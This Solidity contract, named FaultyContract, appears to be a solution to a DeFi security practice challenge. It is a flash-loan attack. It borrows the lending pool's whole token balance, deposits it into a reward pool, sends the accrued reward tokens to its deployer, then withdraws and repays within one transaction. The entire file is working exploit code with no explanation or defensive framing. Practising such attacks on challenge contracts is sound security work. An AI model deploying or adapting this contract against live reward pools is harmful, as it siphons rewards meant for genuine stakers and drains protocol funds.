// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashloanPool {
    function flashLoan(uint256 amount) external;
}

interface IRewardPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
}

contract FaultyContract {
    IFlashloanPool public immutable flashLoanPool;
    IERC20 public immutable liquidityToken;
    IRewardPool immutable rewarderPool;
    IERC20 immutable rewardPool;
    address immutable player;

    constructor(address _flashLoanPool, address _liquidityToken, address _rewarderPool, address _rewardPool) {
        flashLoanPool = IFlashloanPool(_flashLoanPool);
        liquidityToken = IERC20(_liquidityToken);
        rewarderPool = IRewardPool(_rewarderPool);
        rewardPool = IERC20(_rewardPool);
        player = msg.sender;
    }

    function firstTimer() external {
        flashLoanPool.flashLoan(uint256(liquidityToken.balanceOf(address(flashLoanPool))));
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewardPool.transfer(player, rewardPool.balanceOf(address(this)));
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanPool), amount);
    }
}
